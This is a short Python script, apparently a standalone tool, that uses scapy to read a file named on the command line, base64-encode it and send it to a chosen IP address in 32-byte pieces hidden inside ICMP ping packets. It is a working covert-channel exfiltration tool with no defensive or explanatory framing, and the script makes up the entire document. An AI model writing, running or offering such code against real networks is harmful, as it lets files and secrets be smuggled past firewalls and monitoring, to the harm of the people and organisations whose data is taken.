#! /usr/bin/python3
import os
import argparse
import base64
from scapy.sendrecv import sr1
from scapy.layers.inet import IP, ICMP


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-dst", required=True,
                        help="Destination IP address")
    parser.add_argument("-path", required=True, help="File path")

    args = parser.parse_args()

    destination = args.dst
    to_send = args.path

    with open(to_send, "rb") as file:
        to_send_content = file.read()
        base64_payload = base64.b64encode(to_send_content)

    chunks = [base64_payload[i:i+32] for i in range(0, len(base64_payload), 32)]

    for chunk in chunks:
        print(chunk)

        ping = IP(dst=destination, ttl=128)/ICMP(id=0x0001, seq=0x1)/chunk
        sr1(ping,timeout=1)

main()
